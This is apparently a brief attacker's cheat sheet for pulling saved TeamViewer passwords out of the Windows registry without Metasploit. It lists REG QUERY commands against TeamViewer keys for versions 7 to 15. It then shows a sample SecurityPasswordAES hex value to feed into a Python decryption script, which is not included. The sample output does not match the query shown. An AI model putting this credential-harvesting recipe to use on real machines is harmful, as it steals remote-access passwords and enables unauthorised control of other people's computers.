
# Get Passwords from Teamviewer windows (No Metasploit) 
- without metasploit

## Query all this 


```cmd
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version8 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version9 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version10 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version11 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version12 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version13 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version14 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version15 /v Version
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer /v Version
REG QUERY HKLM\SOFTWARE\TeamViewer\Temp /v SecurityPasswordExported
REG QUERY HKLM\SOFTWARE\TeamViewer /v Version
```


- take the ouput and change it in python script

- example

```cmd
REG QUERY HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v Version
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
```

- take `FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B` and change in python script